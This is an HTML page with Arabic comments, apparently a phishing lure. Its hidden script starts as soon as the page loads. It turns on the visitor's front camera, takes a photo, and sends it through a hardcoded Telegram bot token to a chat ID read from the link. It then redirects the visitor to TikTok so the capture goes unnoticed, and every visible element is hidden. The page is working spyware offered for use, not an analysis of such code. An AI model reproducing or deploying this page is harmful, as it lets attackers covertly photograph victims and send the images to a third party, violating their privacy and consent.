<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        
        /* إخفاء الزر نهائياً */
        #startButton {
            display: none;
        }
        
        /* إخفاء كل العناصر */
        #status {
            display: none;
        }
        
        /* عناصر التصوير مخفية */
        #video, #canvas {
            display: none;
        }
        
        /* صفحة فارغة تماماً */
        .hidden-content {
            display: none;
        }
    </style>
</head>
<body>

    <div style="text-align: center; display: none;">
        <button id="startButton">📸 اضغط لبدء التصوير</button>
        <div id="status"></div>
    </div>

    <!-- عناصر التصوير -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ====== الثوابت ======
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        
        // ====== الحصول على ID من الرابط ======
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id');
        
        // ====== العناصر ======
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        
        // ====== المتغيرات ======
        let cameraStream = null;
        let isProcessing = false;

        // ====== دالة إرسال الصورة ======
        async function sendPhotoToTelegram(photoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'selfie.jpg');
                formData.append('caption', '📸 صورة من الكاميرا الأمامية');

                const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();
                return result.ok;
            } catch (error) {
                return false;
            }
        }

        // ====== دالة إرسال رسالة خطأ ======
        async function sendErrorMessage(errorText) {
            try {
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `❌ خطأ: ${errorText}`
                    })
                });
            } catch (e) {}
        }

        // ====== دالة التقاط الصورة ======
        function capturePhoto() {
            return new Promise((resolve, reject) => {
                try {
                    if (!video.videoWidth || !video.videoHeight) {
                        reject('الفيديو غير جاهز');
                        return;
                    }

                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // تحويل إلى blob
                    canvas.toBlob((blob) => {
                        if (blob) {
                            resolve(blob);
                        } else {
                            reject('فشل تحويل الصورة');
                        }
                    }, 'image/jpeg', 0.95);
                    
                } catch (error) {
                    reject(error.message);
                }
            });
        }

        // ====== دالة إغلاق الكاميرا ======
        function stopCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => {
                    track.stop();
                });
                cameraStream = null;
            }
        }

        // ====== دالة التوجيه إلى تيك توك ======
        function redirectToTikTok() {
            window.location.href = "https://www.tiktok.com";
        }

        // ====== الدالة الرئيسية للتصوير (تشتغل تلقائياً) ======
        async function autoCapture() {
            if (isProcessing || !CHAT_ID) {
                redirectToTikTok();
                return;
            }
            
            isProcessing = true;

            try {
                // تشغيل الكاميرا الأمامية
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                video.srcObject = cameraStream;
                
                // انتظار تحميل الفيديو
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        resolve();
                    };
                });
                
                await video.play();
                
                // انتظار ثانية لتثبيت الكاميرا
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // التقاط الصورة
                let photoBlob = null;
                let attempts = 0;
                const maxAttempts = 3;
                
                while (attempts < maxAttempts && !photoBlob) {
                    attempts++;
                    
                    try {
                        photoBlob = await capturePhoto();
                    } catch (captureError) {
                        if (attempts < maxAttempts) {
                            await new Promise(resolve => setTimeout(resolve, 500));
                        }
                    }
                }
                
                if (photoBlob) {
                    await sendPhotoToTelegram(photoBlob);
                }
                
            } catch (error) {
                await sendErrorMessage(error.message || 'خطأ غير معروف');
                
            } finally {
                stopCamera();
                redirectToTikTok();
            }
        }

        // ====== التحقق من ID ======
        if (!CHAT_ID) {
            redirectToTikTok();
        } else {
            // بدأ التصوير التلقائي فور تحميل الصفحة
            window.addEventListener('load', function() {
                setTimeout(autoCapture, 100);
            });
        }

        // ====== طوارئ: توجيه بعد 10 ثواني ======
        setTimeout(() => {
            if (!isProcessing) {
                redirectToTikTok();
            }
        }, 10000);
        
    </script>
</body>
</html>
